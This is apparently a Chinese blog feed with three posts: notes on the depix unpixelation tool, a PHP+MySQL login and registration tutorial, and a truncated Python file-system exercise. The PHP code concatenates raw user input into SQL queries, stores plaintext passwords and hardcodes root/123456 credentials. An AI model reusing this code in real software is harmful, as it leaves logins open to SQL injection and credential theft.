output.png</span><br></pre></td></tr></table></figure><p>在这里均使用了作者提供的默认图片，运行的时候需要一点时间。</p><p>还原后的图片</p><p><img src="https://img-blog.csdnimg.cn/20201215161808955.png"></p><h1 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a>可能遇到的问题</h1><blockquote><p>ImportError: No module named PIL</p></blockquote><p>未安装 pillow（python的图像处理库）这时候需要在文件目录键入一下命令。</p><blockquote><p>pip install pillow</p></blockquote><p><a href="https://blog.csdn.net/weixin_38252066/article/details/111143406?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160860532116780299069245%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&request_id=160860532116780299069245&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-3-111143406.nonecase&utm_term=depix">参考链接</a></p><h1 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h1><p>目前该项目的局限性挺多，根据作者给出的算法解释<br><em>The algorithm uses the fact that the linear box filter processes every block separately. For every block it pixelizes all blocks in the search image to check for direct matches.</em></p><ul><li>使用了“线性盒式滤波器”，也就是如果使用微信上的马赛克就会对还原效果产生影响。</li><li>同时在还原的时候需要将图像切割成相应的块。</li><li>需要用到序列化的图像，这也就意味着会给汉字的匹配带来许多困难。</li><li>无法实时逆转</li></ul><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>无论如何，depix始终是一个十分有趣的开源项目。（可能下一道misc就会与此有关）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近有一个开源项目depix在github上面很火–通过特定的算法可将马赛克恢复。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF求生之路" scheme="http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"/>
    
    <category term="教程" scheme="http://favorhau.github.io/categories/%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="CTF" scheme="http://favorhau.github.io/tags/CTF/"/>
    
    <category term="马赛克" scheme="http://favorhau.github.io/tags/%E9%A9%AC%E8%B5%9B%E5%85%8B/"/>
    
  </entry>
  
  <entry>
    <title>PHP+MYSQL实现简单的用户注册功能</title>
    <link href="http://favorhau.github.io/2020/12/21/PHP+MYSQL%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%9A%84%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C%E5%8A%9F%E8%83%BD/"/>
    <id>http://favorhau.github.io/2020/12/21/PHP+MYSQL%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%9A%84%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C%E5%8A%9F%E8%83%BD/</id>
    <published>2020-12-21T14:29:26.000Z</published>
    <updated>2020-12-21T11:05:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>~冬至快乐！</p><p>有必要用一下php+mysql实现一下这个“最基础”的用户功能，（虽然开发可能会用后端云）</p><span id="more"></span><h1 id="基础结构"><a href="#基础结构" class="headerlink" title="基础结构"></a>基础结构</h1><p>html+css+JavaScript作前端渲染；<br>php作为后端，mysql作为数据库。<br>在这里暂时不涉及到安全问题（比如验证码和token等）<br>组成分为：注册页面与登录页面。</p><h1 id="登录页面"><a href="#登录页面" class="headerlink" title="登录页面"></a>登录页面</h1><p>为什么我先从登录页面开始？<br>因为我觉得整一个流程最核心的部分就在于<strong>登录</strong><br>因为无论如何，注册可以通过自己在数据增加完成<del>假后台</del>，而我们作为一个user需要去获得admin就需要通过登录去完成。</p><h2 id="login-html"><a href="#login-html" class="headerlink" title="login.html"></a>login.html</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//login.html</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;login.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>username:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>password:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h2><p>写完了html页面该到php了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;cotent-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="comment">//receive the data from client</span></span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$pwd</span>=<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="comment">//telnet mysql</span></span><br><span class="line"><span class="variable">$db</span>=mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="comment">//select the databases</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$db</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;数据库连接失败&#x27;</span>.<span class="variable">$mysql_error</span>());</span><br><span class="line">&#125;</span><br><span class="line">mysql_select_db(<span class="string">&quot;favorhau&quot;</span>,<span class="variable">$db</span>);</span><br><span class="line"><span class="comment">//decode</span></span><br><span class="line">mysql_query(<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line"><span class="comment">//check</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from administrator where username =&#x27;<span class="subst">$name</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$res</span>= mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$nub</span>= mysql_num_rows(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$nub</span>==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;null&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//echo</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$rs</span>=mysql_fetch_object(<span class="variable">$res</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rs</span>-&gt;password!=<span class="variable">$pwd</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;false&#x27;)&lt;/script&gt;;&quot;</span>;</span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;)&lt;/script&gt;;&quot;</span>;</span><br><span class="line">        mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时，其实一个用户系统已经可以开始启用了，可以来试一下。<br><em>php和html是可以写在一起的</em><br><a href="https://imgchr.com/i/r0lBoF"><img src="https://s3.ax1x.com/2020/12/21/r0lBoF.png" alt="r0lBoF.png"></a><br>新建一个数据库，数据表，字段为相应的“username”和“password”。<br>（当然也可以使用sql语句）<br><a href="https://imgchr.com/i/r01Q61"><img src="https://s3.ax1x.com/2020/12/21/r01Q61.png" alt="r01Q61.png"></a><br>我们先模拟注册（新建一个值admin对应密码admin）<br>此时已经拥有一个用户admin了。</p><p>这时候一个无样式的表单就完成了</p><p><a href="https://imgchr.com/i/r03lCQ"><img src="https://s3.ax1x.com/2020/12/21/r03lCQ.png" alt="r03lCQ.png"></a><br>可以具备登录的功能。</p><h1 id="注册页面"><a href="#注册页面" class="headerlink" title="注册页面"></a>注册页面</h1><p>那么当然，登录需要对应有注册。<br>这时候就需要进行注册页面的设置。</p><h2 id="register-html"><a href="#register-html" class="headerlink" title="register.html"></a>register.html</h2><p>为了能更清楚地展现前端后端的作用，还是采用了分开文件的编写方式。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>register<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;register.php&quot;</span> <span class="attr">method</span> = <span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">p</span>&gt;</span>用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span> = <span class="string">&quot;uname&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">p</span>&gt;</span>密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span> = <span class="string">&quot;upwd&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">button</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于是注册，需要对输入的内容进行验证，需要加上JavaScript的代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取form元素：</span></span><br><span class="line"><span class="keyword">var</span> oForm = <span class="built_in">document</span>.forms[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//console.log(oForm);</span></span><br><span class="line"><span class="comment">//给oForm 添加onsubmit事件：</span></span><br><span class="line">oForm.onsubmit = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//判断如果用户名、密码符合规则，则可以提交，否则不能提交；</span></span><br><span class="line">    <span class="keyword">if</span>(flagname&amp;&amp;flagpwd)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取用户名、密码元素：</span></span><br><span class="line"><span class="keyword">var</span> oName = oForm.elements[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> oPwd = oForm.elements[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">var</span> oDiv = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(oDiv);</span><br><span class="line"><span class="comment">//声明一个变量控制onsubmit提交：</span></span><br><span class="line"><span class="keyword">var</span> flagname = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//添加失焦事件：</span></span><br><span class="line">oName.onblur = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> reg = <span class="regexp">/^\w&#123;6,10&#125;/</span>;</span><br><span class="line">    <span class="keyword">var</span> str = oForm.elements[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span>(reg.test(str))&#123;</span><br><span class="line">        flagname = <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        oDiv.innerHTML = <span class="string">&quot;包含字母、数字、下划线，在6-10位之间&quot;</span>;</span><br><span class="line">        flagname = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//声明一个变量控制onsubmit提交：</span></span><br><span class="line"><span class="keyword">var</span> flagpwd = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//添加失焦事件：</span></span><br><span class="line">oPwd.onblur = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> reg = <span class="regexp">/^\w&#123;6,10&#125;/</span>;</span><br><span class="line">    <span class="keyword">var</span> str = oForm.elements[<span class="number">1</span>].value;</span><br><span class="line">    <span class="keyword">if</span>(reg.test(str))&#123;</span><br><span class="line">        flagpwd = <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        oDiv.innerHTML = <span class="string">&quot;包含字母、数字、下划线，在6-10位之间&quot;</span>;</span><br><span class="line">        flagpwd = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="register-php"><a href="#register-php" class="headerlink" title="register.php"></a>register.php</h2><p>此时和index.php很像。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">//接受客户端的数据：</span><br><span class="line">$name = $_POST[&quot;uname&quot;];</span><br><span class="line">$pwd = $_POST[&quot;upwd&quot;];</span><br><span class="line">//操作数据库：</span><br><span class="line">//连接数据源：</span><br><span class="line">$db = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;);</span><br><span class="line">//选择数据库：</span><br><span class="line">mysql_select_db(&quot;favorhau&quot;,$db);</span><br><span class="line">//设置编码符：</span><br><span class="line">mysql_query(&quot;set names utf8&quot;);</span><br><span class="line">//编写sql语句：</span><br><span class="line">$sql = &quot;INSERT INTO `administrator`( `username`, `password`) VALUES (&#x27;$name&#x27;,&#x27;$pwd&#x27;)&quot;;</span><br><span class="line">//执行sql语句：</span><br><span class="line">$res = mysql_query($sql);</span><br><span class="line">//返回数据：</span><br><span class="line">if($res)&#123;</span><br><span class="line">    echo&quot;&lt;script&gt;alert(&#x27;注册成功！&#x27;);location.href = &#x27;login.html&#x27;;&lt;/script&gt;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo&quot;&lt;script&gt;alert(&#x27;注册失败！&#x27;);location.href = &#x27;register.html&#x27;;&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这样一个简易的<del>（破烂的）</del>登录注册功能就基本完成了。（后续可以试一下注入自己的（手动滑稽））<br><a href="https://imgchr.com/i/r0JxRe"><img src="https://s3.ax1x.com/2020/12/21/r0JxRe.png" alt="r0JxRe.png"></a></p><h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>完成了一个简单的登录注册功能，后续要考虑的问题其实包括但不限于：</p><ol><li>安全问题（包括但不限于防注入、防爆破、防爬等）</li><li>前端美化</li><li>可维护性等</li></ol><p><del>简单的登陆注册 应该是每一个coder的标配技能吧</del></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;~冬至快乐！&lt;/p&gt;
&lt;p&gt;有必要用一下php+mysql实现一下这个“最基础”的用户功能，（虽然开发可能会用后端云）&lt;/p&gt;</summary>
    
    
    
    <category term="码农日常" scheme="http://favorhau.github.io/categories/%E7%A0%81%E5%86%9C%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="SQL" scheme="http://favorhau.github.io/tags/SQL/"/>
    
    <category term="PHP" scheme="http://favorhau.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>双向链表与DFS的Unix文件储存程序</title>
    <link href="http://favorhau.github.io/2020/12/21/%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8%E4%B8%8EDFS%E7%9A%84Unix%E6%96%87%E4%BB%B6%E5%82%A8%E5%AD%98%E7%A8%8B%E5%BA%8F/"/>
    <id>http://favorhau.github.io/2020/12/21/%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8%E4%B8%8EDFS%E7%9A%84Unix%E6%96%87%E4%BB%B6%E5%82%A8%E5%AD%98%E7%A8%8B%E5%BA%8F/</id>
    <published>2020-12-21T14:29:26.000Z</published>
    <updated>2021-11-28T04:20:50.916Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><blockquote><p>这是一篇关于python编写的小型文件储存程序，旨在于模拟Unix下<code>ls</code>、<code>cd</code>等的命令，在整一个中文互联网世界中，很难找到这样的实现方式，但是从数据结构和算法实现的角度来说存在许多价值。</p></blockquote><span id="more"></span><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>开篇一个题，不得不佩服英文的作业阅读，能够很细节引导学生去实现某一样计算机程序，有一个循序渐进的过程，能够相当于指引一样，并且十分易懂。<br><a href="https://imgtu.com/i/onDJDe"><img src="https://z3.ax1x.com/2021/11/28/onDJDe.md.png" alt="onDJDe.md.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">This exercise is about object oriented programming in Python. Your task is to use objects to implement a representation of a simple file system. In computer science, a file system is a data structure that the Operating System uses to control how data is stored and retrieved from a hard (or solid state) drive. A file system could be represented as a tree, in which files and directories may be organised as a hierarchy, so that, directories may contain subdirectories. For example, a file gatos.jpg may be under Isaac directory, but that is a subdirectory of the home folder. In file systems, a directory is just a file, but it is a special kind of file that contains a list of files. Here is an example:</span><br><span class="line"></span><br><span class="line">Figure 1: An example of a file system as a tree. Directories are represented in circles, plain files in squared boxes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">You can test your code with the test in test-fs.py .</span><br><span class="line">1.Implement the following classes to represent a simple file system:</span><br><span class="line">File: everything is a file</span><br><span class="line">PlainFile: a plain file has a name (we are ignoring its contents)</span><br><span class="line">Directory: has a name and a list of files</span><br><span class="line">with constructors (i.e. init methods), so that, we can define the following directory tree (i.e. file system) based on the image above:</span><br><span class="line"></span><br><span class="line">&gt;&gt; root = Directory(&quot;root&quot;,</span><br><span class="line">[PlainFile(&quot;boot.exe&quot;), Directory(&quot;home&quot;,[</span><br><span class="line">Directory(&quot;thor&quot;, [PlainFile(&quot;hunde.jpg&quot;), PlainFile(&quot;quatsch.txt&quot;)]),</span><br><span class="line">Directory(&quot;isaac&quot;,   [PlainFile(&quot;gatos.jpg&quot;)])])])</span><br><span class="line"></span><br><span class="line">2.Add methods that print (recursively) the entire file system tree (i.e. define appropriate str methods). You don’t need to produce a pretty output</span><br><span class="line">- it is ok if it looks like this:</span><br><span class="line"></span><br><span class="line">Directory(root,[PlainFile(boot.exe),Directory(home, [Directory(thor,[PlainFile(hunde.jpg),PlainFile( quatsch.txt)],Directory(isaac,[PlainFile(gatos.jpg)]]]</span><br><span class="line"></span><br><span class="line">3.A File may have other attributes such as owner. If not indicated, the owner will be set to “default”. Implement a method chown(new_owner) that will allow you to modify the owner of a file or directory.</span><br><span class="line"></span><br><span class="line">&gt;&gt; file = PlainFile(&quot;boot.exe&quot;)</span><br><span class="line">&gt;&gt; folder = Directory(&quot;Downloads&quot;,[])</span><br><span class="line">&gt;&gt; print(f&#x27;file.owner: &#123;file.owner&#125;; folder: &#123;folder.owner&#125;&#x27;) file.owner: default; folder: default</span><br><span class="line">&gt;&gt; file.chown(&quot;root&quot;)</span><br><span class="line">&gt;&gt; folder.chown(&quot;isaac&quot;)</span><br><span class="line">&gt;&gt; print(f&#x27;file.owner: &#123;file.owner&#125;; folder: &#123;folder.owner&#125;&#x27;) file.owner: root; folder: isaac</span><br><span class="line"></span><br><span class="line">4.Implement a method ls() that recursively prints the content of the direc- tory and all the subdirectories, using indentation to represent how deep in the tree structure the file/directory is.</span><br><span class="line"></span><br><span class="line"># if we run ls() on the previous object root:</span><br><span class="line">&gt;&gt; root.ls() root</span><br><span class="line">boot.exe home</span><br><span class="line">thor</span><br><span class="line">hunde.jpg quatsch.txt</span><br><span class="line">isaac</span><br><span class="line">gatos.jpg</span><br><span class="line">5.Implement a new class, FileSystem , which will allow us to navigate and manipulate a file system as if it was a UNIX file system. In particular, this class will allow us to keep track of the working directory. It should be initialised as follows:</span><br><span class="line"></span><br><span class="line">&gt;&gt; fs = FileSystem(root)</span><br><span class="line">(a)Implement a method pwd() that tells you the current working direc- tory. This might be useful later when moving across directories. It should work like this:</span><br><span class="line">&gt;&gt; fs.pwd() &#x27;root&#x27;</span><br><span class="line">(b)Implement ls() for the FileSystem class, so that, fs.ls() would work as question 4, but only printing from the current directory.</span><br><span class="line">(c)Implement a method cd() that will allow you to move to a different directory (changing the working directory). It should work as follows:</span><br><span class="line"># if you try to move to a non existing directory or to a file, # the method should complain:</span><br><span class="line">&gt;&gt; fs.cd(&quot;casa&quot;)</span><br><span class="line">The directory does not exist!</span><br><span class="line"># But you can move to an existing directory in the working directory.</span><br><span class="line">&gt;&gt; fs.cd(&quot;home&quot;)</span><br><span class="line"># if we now do ls(), you should only see the content in home:</span><br><span class="line">&gt;&gt; fs.ls() home</span><br><span class="line">thor</span><br><span class="line">hunde.jpg quatsch.txt</span><br><span class="line">isaac</span><br><span class="line">gatos.jpg</span><br><span class="line">Note that our filesystem is case sensitive, if the user searches for “Home”, the method won’t find the folder, because “home” is a dif- ferent folder.</span><br><span class="line">(d)Implement methods to create files create_file(name) and directo- ries mkdir(name) within the working directory. Both methods should make sure that the file or directory to be created doesn’t already ex- ist within the working directory. Directories must be empty when creating them with mkdir(name). The method mkdir may allow you to indicate the owner when creating it, but files will share the owner of the working directory.</span><br><span class="line">(e)Modify the method cd() to allow us to go back to a parent directory. We will indicate the parent directory as “..”. For 